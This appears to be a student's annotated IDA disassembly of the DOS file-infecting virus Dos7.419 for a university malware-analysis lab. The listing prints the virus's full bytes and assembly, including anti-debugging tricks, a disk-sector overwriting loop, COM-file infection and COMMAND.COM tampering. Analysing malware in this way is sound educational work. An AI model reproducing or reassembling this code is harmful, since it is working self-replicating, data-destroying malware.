seg000:0100                            ;
seg000:0100                            ; +-------------------------------------------------------------------------+
seg000:0100                            ; |      This file was generated by The Interactive Disassembler (IDA)      |
seg000:0100                            ; |           Copyright (c) 2022 Hex-Rays, <support@hex-rays.com>           |
seg000:0100                            ; |                      License info: 48-BABB-7E64-E2                      |
seg000:0100                            ; |                     Georgia Institute of Technology                     |
seg000:0100                            ; +-------------------------------------------------------------------------+
seg000:0100                            ;
seg000:0100                            ; Input SHA256 : 7E00694397CBB7B422CB2F3E39A34C7FB7554931A1A9A2CF9AE7B2BCF42296E3
seg000:0100                            ; Input MD5    : 0B4A318803AA1B9B6A0DCC55CEFCB7CE
seg000:0100                            ; Input CRC32  : 785762D7
seg000:0100
seg000:0100                            ; ---------------------------------------------------------------------------
seg000:0100                            ; File Name   : /nethome/ankemla3/Desktop/ECE4117/lab3/Virus.DOS.Dos7.419
seg000:0100                            ; Format      : Binary file
seg000:0100                            ; Base Address: 0000h Range: 0100h - 02C8h Loaded length: 01C8h
seg000:0100
seg000:0100                                            .686p
seg000:0100                                            .mmx
seg000:0100                                            .model small
seg000:0100
seg000:0100                            ; ===========================================================================
seg000:0100
seg000:0100                            ; Segment type: Pure code
seg000:0100                            seg000          segment byte public 'CODE' use16
seg000:0100                                            assume cs:seg000
seg000:0100                                            ;org 100h
seg000:0100                                            assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing
seg000:0100
seg000:0100                            loc_100:                                ; loc_106 is data section containing code about obfuscating virus
seg000:0100 C7 06 07 01 52 01                          mov     word ptr ds:loc_106+1, 152h ; essentially point loc 152h of code/data for if debugger is caught
seg000:0106
seg000:0106                            loc_106:                                ; DATA XREF: seg000:loc_100↑w
seg000:0106 B8 52 01                                   mov     ax, 152h        ; Set location 152h for code if debugger is detected and access only when debugger is detected else go to loc 168
seg000:0109 A3 2E 01                                   mov     word ptr ds:loc_129+5, ax ; set code pointed to by ax word size 152h to ptr at section loc_129+5
seg000:0109                                                                    ;
seg000:0109                                                                    ; (go to opcode from loc 129 + 5 opcodes and override those with ax)
seg000:0109                                                                    ;
seg000:0109                                                                    ; Storing offset in the event of debugger (152) or overriding int0 (168)
seg000:010C 2B C0                                      sub     ax, ax          ; ax =0
seg000:010E 1E                                         push    ds              ; store value in data section register for ret
seg000:010F 8E D8                                      mov     ds, ax          ; set ds to be  data in ax (set code offset)
seg000:0111 8E C0                                      mov     es, ax          ; set code segment in es
seg000:0113 BE 84 00                                   mov     si, 84h         ; set source for the movsw operation
seg000:0113                                                                    ; mov si, 21h*4-> relate to int 21h
seg000:0116 BF 0C 00                                   mov     di, 0Ch         ; set destination of the movsw operation to 0CH which is mov di, 3h*4-> int 3h
seg000:0119 A5                                         movsw                   ; Move Data from String (si) to String (di)=> give int3h functionality of int 21h to execute dos functions
seg000:0119                                                                    ; call to int 3h acts as call to int 21h
seg000:011A A5                                         movsw                   ; move the next word of data from si+2 to di+2
seg000:011B 26 A1 00 00                                mov     ax, es:0        ; set ax to es:0 -> es*16+0
seg000:011B                                                                    ; set ax to be the first int so int0
seg000:011F A3 70 01                                   mov     word ptr ds:loc_16B+5, ax ; set pointer to ds:170 to ax
seg000:011F                                                                    ; saving int0
seg000:0122 26 A1 02 00                                mov     ax, es:2        ; ax = es:2 (es*16+2)
seg000:0122                                                                    ; point int 0 to code segment (int 0 called by a divide by 0 error)
seg000:0126 A3 77 01                                   mov     word ptr ds:loc_172+5, ax ; data from ptr to ds:177 overwritten with value in ax= mem location of es:2
seg000:0129
seg000:0129                            loc_129:                                ; DATA XREF: seg000:0109↑w
seg000:0129 26 C7 06 52 01 4C 4D                       mov     word ptr es:loc_152, 4D4Ch ; es:0 ->changed to loc 152 due to change from
seg000:0130 1F                                         pop     ds              ; ds = original ds pushed earlier
seg000:0131 8C D8                                      mov     ax, ds          ; ax=ds
seg000:0133 80 C4 10                                   add     ah, 10h         ; moved ds to ax to modify upper bits by adding 10h so reg ax becomes ...10h->ah ds->al
seg000:0133                                                                    ; ah =10h=4096
seg000:0136 26 A3 02 00                                mov     es:2, ax        ; corresponds to moving ds to es: 2 using ax
seg000:013A 8E C0                                      mov     es, ax          ; es=ds with modified upper bits, changing the es used in the movsb instruction for the destination
seg000:013C                                            assume es:nothing
seg000:013C BF 00 01                                   mov     di, 100h        ; set destination to es:di where di =100
seg000:013F 8B F7                                      mov     si, di          ; set source to ds:si where si =100
seg000:0141 B9 A3 01                                   mov     cx, 1A3h        ; set number of bytes to be copied to 419
seg000:0144 F3 A4                                      rep movsb               ; Copy cx bytes of data (malware in this case) starting from ds:si to es:di
seg000:0144                                                                    ; Increase file size by copying virus into the first 419 bytes of file
seg000:0146 8E D8                                      mov     ds, ax
seg000:0148                                            assume ds:nothing
seg000:0148 F7 F1                                      div     cx              ; takes number in ax and divides by cx and store answer in ax with cx as remainder
seg000:0148                                                                    ; assume its divide by 0 to trigger int 0 error ?(why else would divide be called) to trigger interrupt
seg000:014A
seg000:014A                            close_handle:                           ; CODE XREF: seg000:01AB↓j
seg000:014A B4 3E                                      mov     ah, 3Eh ; '>'   ; 3eh->Close  a  file  handle
seg000:014C CC                                         int     3               ; Trap to Debugger
seg000:014C                                                                    ; every call to int 3 is an attempt to evade detection or make it more difficult to reverse engineer malware.
seg000:014C                                                                    ; It causes a software interrupt inthe event of the debugger which prevents analysis ofmalware
seg000:014D
seg000:014D                            find_next:                              ; CODE XREF: seg000:0195↓j
seg000:014D                                                                    ; seg000:01A5↓j
seg000:014D B4 4F                                      mov     ah, 4Fh ; 'O'   ; 4Fh->Find  next  matching  file  (FIND  NEXT)
seg000:014F CC                                         int     3               ; Trap to Debugger
seg000:0150 EB 3A                                      jmp     short check_fileid
seg000:0152                            ; ---------------------------------------------------------------------------
seg000:0152
seg000:0152                            loc_152:                                ; DATA XREF: seg000:loc_129↑w
seg000:0152 2B C9                                      sub     cx, cx          ; cx=0
seg000:0152                                                                    ;
seg000:0152                                                                    ; Note: If debugger is detected do the following
seg000:0154
seg000:0154                            if_debugger:                            ; CODE XREF: seg000:0166↓j
seg000:0154 41                                         inc     cx              ; cx=+1
seg000:0154                                                                    ;
seg000:0154                                                                    ; cx relates to sector starting at sector 1 on hardrive
seg000:0155 0E                                         push    cs              ; store cs on stack
seg000:0156 07                                         pop     es              ; grab segment address
seg000:0156                                                                    ; cs=es
seg000:0157                                            assume es:nothing
seg000:0157
seg000:0157                            loc_157:                                ; CODE XREF: seg000:015A↓j
seg000:0157 B8 05 FE                                   mov     ax, 0FE05h      ; ax=0fe05h
seg000:015A EB FC                                      jmp     short near ptr loc_157+1 ; jump to opcode in line above 05 which is opcode for add  ax, fe -> ax=254
seg000:015A                                                                    ; another 3 times mean ax=762
seg000:015C                            ; ---------------------------------------------------------------------------
seg000:015C 2D 02 E7                                   sub     ax, 0E702h      ; ax value obfuscation
seg000:015C                                                                    ; set values al and ah through ax for the call to int 13h to write to disk
seg000:015F B7 01                                      mov     bh, 1           ; bh=1
seg000:015F                                                                    ; buffer on disk
seg000:0161 BA 00 00                                   mov     dx, 0           ; dx=0
seg000:0161                                                                    ; dh-> head 0
seg000:0161                                                                    ; cx->sector
seg000:0164 CD 13                                      int     13h             ; Write to Disk
seg000:0164                                                                    ; CH = cylinder & 0xff
seg000:0164                                                                    ; CL = Sector
seg000:0164                                                                    ; DISK - DISK - SET TYPE (AT,XT2,XT286,CONV,PS
seg000:0164                                                                    ; AL = disk type AL = 03h - high-capacity disk in high-capacity drive
seg000:0166 EB EC                                      jmp     short if_debugger ; This loop just rewrites sectors on disk 1 which is disk B(?) if ddebugger detected
seg000:0168                            ; ---------------------------------------------------------------------------
seg000:0168 06                                         push    es              ; go here if no debugger
seg000:0169 51                                         push    cx
seg000:016A 07                                         pop     es
seg000:016B
seg000:016B                            loc_16B:                                ; DATA XREF: seg000:011F↑w
seg000:016B 26 C7 06 00 00 4C 4D                       mov     word ptr es:0, 'ML' ; changing es:0 destination to be whats in ax from previous instruction
seg000:0172
seg000:0172                            loc_172:                                ; DATA XREF: seg000:0126↑w
seg000:0172 26 C7 06 02 00 41 53                       mov     word ptr es:2, 'SA' ; reset changes made to int 0 in above code
seg000:0179 07                                         pop     es              ; set new es
seg000:017A C7 06 07 01 68 01                          mov     word ptr ds:107h, 168h ; reset second line and opcode from curr value of 152 to 168
seg000:017A                                                                    ; reset virus to original state because no debugger was caught?
seg000:0180 B4 1A                                      mov     ah, 1Ah         ; Set  disk  transfer  address
seg000:0182 99                                         cwd                     ; convert word to double word
seg000:0183 CC                                         int     3               ; Trap to Debugger
seg000:0183                                                                    ; call int 21h for function 1Ah
seg000:0184 B4 4E                                      mov     ah, 4Eh ; 'N'   ; find first matching file
seg000:0184                                                                    ; in this case searching for command.com file
seg000:0186 2B C9                                      sub     cx, cx          ; set cx=0
seg000:0186                                                                    ; cx is match attribute
seg000:0188 BA 23 02                                   mov     dx, 223h        ; DS:DX points to ASCII filename
seg000:0188                                                                    ; 223-.com file
seg000:018B CC                                         int     3               ; Issue request to DOS for finding first file
seg000:018C
seg000:018C                            check_fileid:                           ; CODE XREF: seg000:0150↑j
seg000:018C 72 7E                                      jb      short restore_changes ; if file finding generates error jump and restore host
seg000:018E B8 02 3D                                   mov     ax, 3D02h       ; ah=3Dh->open file
seg000:018E                                                                    ; al=02->open mode
seg000:0191 BA 1E 00                                   mov     dx, 1Eh         ; file name in DTA
seg000:0194 CC                                         int     3               ; Trap to Debugger
seg000:0194                                                                    ; check file to see if it matches file that were trying to get
seg000:0195 72 B6                                      jb      short find_next ; grab next file if file doesnot match
seg000:0197 8B D8                                      mov     bx, ax          ; file handle
seg000:0199 B4 3F                                      mov     ah, 3Fh ; '?'   ; read from file
seg000:019B BF 1A 00                                   mov     di, 1Ah
seg000:019E 8B 0D                                      mov     cx, [di]        ; buffer size
seg000:01A0 8B D6                                      mov     dx, si          ; offset buffer
seg000:01A2 CC                                         int     3               ; Trap to debugger
seg000:01A2                                                                    ; issue request to dos
seg000:01A3 8B 04                                      mov     ax, [si]        ; grab file content stored in buffer
seg000:01A5 72 A6                                      jb      short find_next ; find other file if error thrown
seg000:01A7 3B 06 00 01                                cmp     ax, ds:100h     ; check if file already has infected coded
seg000:01AB 74 9D                                      jz      short close_handle ; if infected already close file
seg000:01AD 8B 44 02                                   mov     ax, [si+2]      ; check for third and fourth line to check if command.com file rather than just .com
seg000:01B0 3D 15 60                                   cmp     ax, 6015h       ; check if its DOS's command file
seg000:01B3 74 02                                      jz      short infect_command ; infect and edit command.com if found
seg000:01B5 EB 3F                                      jmp     short infect_file ; infect normal .com file
seg000:01B7                            ; ---------------------------------------------------------------------------
seg000:01B7
seg000:01B7                            infect_command:                         ; CODE XREF: seg000:01B3↑j
seg000:01B7 57                                         push    di              ; this routine alters functions in command.com
seg000:01B8 56                                         push    si              ; save segment and offset on stack
seg000:01B9 BE 4D 02                                   mov     si, 24Dh        ; 24dh-> grab dos copyright notice 'MSDOS 7 (C)1993 ANARKICK SYSTEMS'
seg000:01BC BF F0 23                                   mov     di, 23F0h       ; set di and si for copyright->destination in command.com to copy to
seg000:01BF B9 55 00                                   mov     cx, 55h ; 'U'   ; cx=antivirus length
seg000:01C2 90                                         nop
seg000:01C3 FC                                         cld                     ; CLD clears the direction flag, increment si and di after each iteration
seg000:01C4 F3 A4                                      rep movsb               ; copy lines from ds:si, es:di
seg000:01C6 BE 2A 02                                   mov     si, 22Ah        ; message "is infected"
seg000:01C9 BF 57 90                                   mov     di, 9057h       ; destination in command.com to copy to
seg000:01CC B9 0C 00                                   mov     cx, 0Ch         ; message length
seg000:01CF 90                                         nop
seg000:01D0 F3 A4                                      rep movsb               ; copy message from seg and offset
seg000:01D2 BE 36 02                                   mov     si, 236h        ; message "oy, are you...."
seg000:01D5 BF 4C 91                                   mov     di, 914Ch       ; destination in command.com to copy to
seg000:01D8 B9 17 00                                   mov     cx, 17h         ; cx=message size
seg000:01DB 90                                         nop
seg000:01DC F3 A4                                      rep movsb               ; copy file
seg000:01DE B8 00 42                                   mov     ax, 4200h       ; 42h-Move File Read/Write Pointer-> 00-go to start of file
seg000:01E1 2B D2                                      sub     dx, dx          ; file offset position
seg000:01E3 8B CA                                      mov     cx, dx          ; set position on file (beginning)
seg000:01E5 CC                                         int     3               ; Trap to Debugger
seg000:01E6 B4 40                                      mov     ah, 40h ; '@'   ; Write message back to file
seg000:01E8 BA A3 02                                   mov     dx, 2A3h        ; message offset
seg000:01EB B9 BD CE                                   mov     cx, 0CEBDh      ; message length
seg000:01EE CC                                         int     3               ; request to dos for function call
seg000:01EF B4 3E                                      mov     ah, 3Eh ; '>'   ; close file
seg000:01F1 CC                                         int     3
seg000:01F2 5E                                         pop     si
seg000:01F3 5F                                         pop     di              ; restore segment and offset addresses
seg000:01F4 EB 16                                      jmp     short restore_changes
seg000:01F6                            ; ---------------------------------------------------------------------------
seg000:01F6
seg000:01F6                            infect_file:                            ; CODE XREF: seg000:01B5↑j
seg000:01F6 B8 00 42                                   mov     ax, 4200h       ; 42h-Move File Read/Write Pointer-> 00-go to start of file
seg000:01F9 2B D2                                      sub     dx, dx          ; file offset position
seg000:01FB 8B CA                                      mov     cx, dx
seg000:01FD CC                                         int     3               ; Trap to Debugger
seg000:01FD                                                                    ; execute function call
seg000:01FE FE C6                                      inc     dh              ; go to next position
seg000:0200 B4 40                                      mov     ah, 40h ; '@'   ; write to beginning of file
seg000:0202 8B 0D                                      mov     cx, [di]        ; buffer size youre trying to write
seg000:0204 81 C1 A3 01                                add     cx, 1A3h        ; increment size of file by 419 bytes which will carry infected code
seg000:0208 CC                                         int     3               ; Trap to Debugger
seg000:0208                                                                    ; execute function call-> write infected code to beginning of file
seg000:0209 B4 3E                                      mov     ah, 3Eh ; '>'   ; close file
seg000:020B CC                                         int     3               ; Trap to Debugger
seg000:020C
seg000:020C                            restore_changes:                        ; CODE XREF: seg000:check_fileid↑j
seg000:020C                                                                    ; seg000:01F4↑j
seg000:020C 8C D0                                      mov     ax, ss
seg000:020E 8E C0                                      mov     es, ax          ; restore es and ds
seg000:0210 8E D8                                      mov     ds, ax
seg000:0212                                            assume ds:nothing
seg000:0212 50                                         push    ax              ; prepare to retf to host by storing stack pointer
seg000:0213 B4 1A                                      mov     ah, 1Ah         ; DTA
seg000:0215 D1 EA                                      shr     dx, 1           ; restore DTA as it was
seg000:0217 CC                                         int     3               ; call funtion
seg000:0218 BF 00 01                                   mov     di, 100h        ; segment offset entry to .com
seg000:021B 57                                         push    di              ; store proper entry point on stack
seg000:021C 8B CC                                      mov     cx, sp          ; cx=sp
seg000:021E 2B CE                                      sub     cx, si          ; cx=sp-si->move host to proper point
seg000:0220 F3 A4                                      rep movsb               ; restore com ofs and execute
seg000:0222 CB                                         retf                    ; return
seg000:0222                            ; ---------------------------------------------------------------------------
seg000:0223 2A                                         db  2Ah ; *             ; what files to look for
seg000:0224 57                                         db  57h ; W
seg000:0225 2E 43 3F 4D 00             aCM             db '.C?M',0
seg000:022A 69                                         db  69h ; i             ; message written to command.com
seg000:022B 73                                         db  73h ; s
seg000:022C 20 69                                      dw 6920h
seg000:022E 6E                                         db  6Eh ; n
seg000:022F 66                                         db  66h ; f
seg000:0230 65                                         db  65h ; e
seg000:0231 63                                         db  63h ; c
seg000:0232 74                                         db  74h ; t
seg000:0233 65                                         db  65h ; e
seg000:0234 64                                         db  64h ; d
seg000:0235 21                                         db  21h ; !
seg000:0236 6F                                         db  6Fh ; o
seg000:0237 79                                         db  79h ; y
seg000:0238 2C                                         db  2Ch ; ,
seg000:0239 20                                         db  20h
seg000:023A 61                                         db  61h ; a
seg000:023B 72                                         db  72h ; r
seg000:023C 65                                         db  65h ; e
seg000:023D 20                                         db  20h
seg000:023E 79                                         db  79h ; y
seg000:023F 6F                                         db  6Fh ; o
seg000:0240 75                                         db  75h ; u
seg000:0241 20                                         db  20h
seg000:0242 65                                         db  65h ; e
seg000:0243 76                                         db  76h ; v
seg000:0244 65                                         db  65h ; e
seg000:0245 72                                         db  72h ; r
seg000:0246 20                                         db  20h
seg000:0247 64                                         db  64h ; d
seg000:0248 75                                         db  75h ; u
seg000:0249 6D                                         db  6Dh ; m
seg000:024A 62                                         db  62h ; b
seg000:024B 21                                         db  21h ; !
seg000:024C 20                                         db  20h
seg000:024D 4D                                         db  4Dh ; M
seg000:024E 53                                         db  53h ; S
seg000:024F 44                                         db  44h ; D
seg000:0250 4F                                         db  4Fh ; O
seg000:0251 53                                         db  53h ; S
seg000:0252 20                                         db  20h
seg000:0253 37                                         db  37h ; 7
seg000:0254 20                                         db  20h
seg000:0255 28                                         db  28h ; (
seg000:0256 43                                         db  43h ; C
seg000:0257 29                                         db  29h ; )
seg000:0258 31                                         db  31h ; 1
seg000:0259 39                                         db  39h ; 9
seg000:025A 39                                         db  39h ; 9
seg000:025B 33                                         db  33h ; 3
seg000:025C 20                                         db  20h
seg000:025D 41                                         db  41h ; A
seg000:025E 4E                                         db  4Eh ; N
seg000:025F 41                                         db  41h ; A
seg000:0260 52                                         db  52h ; R
seg000:0261 4B                                         db  4Bh ; K
seg000:0262 49                                         db  49h ; I
seg000:0263 43                                         db  43h ; C
seg000:0264 4B                                         db  4Bh ; K
seg000:0265 20                                         db  20h
seg000:0266 53                                         db  53h ; S
seg000:0267 59                                         db  59h ; Y
seg000:0268 53                                         db  53h ; S
seg000:0269 54                                         db  54h ; T
seg000:026A 45                                         db  45h ; E
seg000:026B 4D                                         db  4Dh ; M
seg000:026C 53                                         db  53h ; S
seg000:026D 0D                                         db  0Dh
seg000:026E 0A                                         db  0Ah
seg000:026F 01                                         db    1
seg000:0270 01                                         db    1
seg000:0271 01                                         db    1
seg000:0272 20                                         db  20h
seg000:0273 20                                         db  20h
seg000:0274 20                                         db  20h
seg000:0275 20                                         db  20h
seg000:0276 20                                         db  20h
seg000:0277 44                                         db  44h ; D
seg000:0278 4F                                         db  4Fh ; O
seg000:0279 53                                         db  53h ; S
seg000:027A 20                                         db  20h
seg000:027B 36                                         db  36h ; 6
seg000:027C 20                                         db  20h
seg000:027D 41                                         db  41h ; A
seg000:027E 6E                                         db  6Eh ; n
seg000:027F 74                                         db  74h ; t
seg000:0280 69                                         db  69h ; i
seg000:0281 76                                         db  76h ; v
seg000:0282 69                                         db  69h ; i
seg000:0283 72                                         db  72h ; r
seg000:0284 75                                         db  75h ; u
seg000:0285 73                                         db  73h ; s
seg000:0286 20                                         db  20h
seg000:0287 73                                         db  73h ; s
seg000:0288 75                                         db  75h ; u
seg000:0289 63                                         db  63h ; c
seg000:028A 6B                                         db  6Bh ; k
seg000:028B 73                                         db  73h ; s
seg000:028C 2E                                         db  2Eh ; .
seg000:028D 20                                         db  20h
seg000:028E 49                                         db  49h ; I
seg000:028F 74                                         db  74h ; t
seg000:0290 20                                         db  20h
seg000:0291 6D                                         db  6Dh ; m
seg000:0292 69                                         db  69h ; i
seg000:0293 73                                         db  73h ; s
seg000:0294 73                                         db  73h ; s
seg000:0295 65                                         db  65h ; e
seg000:0296 64                                         db  64h ; d
seg000:0297 20                                         db  20h
seg000:0298 74                                         db  74h ; t
seg000:0299 68                                         db  68h ; h
seg000:029A 69                                         db  69h ; i
seg000:029B 73                                         db  73h ; s
seg000:029C 20                                         db  20h
seg000:029D 6F                                         db  6Fh ; o
seg000:029E 6E                                         db  6Eh ; n
seg000:029F 65                                         db  65h ; e
seg000:02A0 21                                         db  21h ; !
seg000:02A1 20                                         db  20h
seg000:02A2 24                                         db  24h ; $
seg000:02A3 B4                                         db 0B4h
seg000:02A4 09                                         db    9
seg000:02A5 BA                                         db 0BAh
seg000:02A6 09                                         db    9
seg000:02A7 01                                         db    1
seg000:02A8 CC                                         db 0CCh
seg000:02A9 B4                                         db 0B4h
seg000:02AA 4C                                         db  4Ch ; L
seg000:02AB CC                                         db 0CCh
seg000:02AC 5B                                         db  5Bh ; [
seg000:02AD 44                                         db  44h ; D
seg000:02AE 4F                                         db  4Fh ; O
seg000:02AF 53                                         db  53h ; S
seg000:02B0 20                                         db  20h
seg000:02B1 37                                         db  37h ; 7
seg000:02B2 76                                         db  76h ; v
seg000:02B3 01                                         db    1
seg000:02B4 01                                         db    1
seg000:02B5 01                                         db    1
seg000:02B6 5D                                         db  5Dh ; ]
seg000:02B7 20                                         db  20h
seg000:02B8 4C                                         db  4Ch ; L
seg000:02B9 75                                         db  75h ; u
seg000:02BA 63                                         db  63h ; c
seg000:02BB 69                                         db  69h ; i
seg000:02BC 66                                         db  66h ; f
seg000:02BD 65                                         db  65h ; e
seg000:02BE 72                                         db  72h ; r
seg000:02BF 20                                         db  20h
seg000:02C0 4D                                         db  4Dh ; M
seg000:02C1 65                                         db  65h ; e
seg000:02C2 73                                         db  73h ; s
seg000:02C3 73                                         db  73h ; s
seg000:02C4 69                                         db  69h ; i
seg000:02C5 61                                         db  61h ; a
seg000:02C6 68                                         db  68h ; h
seg000:02C7 24                                         db  24h ; $
seg000:02C7                            seg000          ends
seg000:02C7
seg000:02C7
seg000:02C7                                            end
